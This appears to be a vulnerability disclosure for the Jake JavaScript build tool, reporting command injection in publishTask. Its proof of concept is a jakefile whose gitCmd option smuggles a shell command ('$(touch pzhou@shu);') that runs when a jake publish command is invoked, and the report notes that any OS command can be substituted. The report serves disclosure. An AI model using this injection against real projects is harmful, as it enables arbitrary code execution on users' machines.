## description
Jake -- the JavaScript build tool for Node.js. 

Jake is the JavaScript build tool for NodeJS. Jake has been around since the very early days of Node, and is full featured and well tested.

It has capabilities similar to GNU Make, CMake, or Rake in the Ruby community.

Similar tools in the Node and JavaScript ecosystem are Grunt and Gulp.

The jake publishTask is vulnerable to command injection and can cause arbitrary code execution, possibly leading to malware propagation via the jake toolchain.

## PoC
Create jakefile.js with the contents below:

//jakefile.js

let { publishTask } = require('jake');

publishTask('abc', {gitCmd: '$(touch pzhou@shu);'}, () => {});

//end of jakefile.js

run 'jake publish fetchTags' in your terminal, then the file pzhou@shu can be illegally created.

Note that, we can replace 'touch pzhou@shu' with any other OS command to execute.
